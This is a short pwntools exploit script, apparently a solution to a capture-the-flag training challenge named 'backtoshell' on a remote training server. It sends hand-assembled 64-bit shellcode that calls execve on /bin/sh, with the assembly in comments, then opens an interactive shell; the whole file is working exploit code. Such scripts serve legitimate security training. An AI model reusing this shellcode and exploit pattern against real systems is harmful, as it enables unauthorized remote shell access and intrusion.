from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

#r = process("./backtoshell") #
r = remote("bin.training.jinblack.it", 3001)

#add rax, 0x1e
#lea rdi, [rax]
#mov rax, 0x3b
#mov rsi, 0
#mov rdx, 0
#syscall

#gdb.attach(r, """
#	b *(main +67)
#	b *(main +122)
#""")
# you can use ghidra to find it the right address
#input("wait")


shellcode_64 =b"\x48\x83\xC0\x1E\x48\x8D\x38\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05/bin/sh\x00"
                

print(shellcode_64)
print("lunghezza in bytes dello shellcode: "+ str(len(shellcode_64)))

r.send(shellcode_64)


r.interactive()

#input("wait")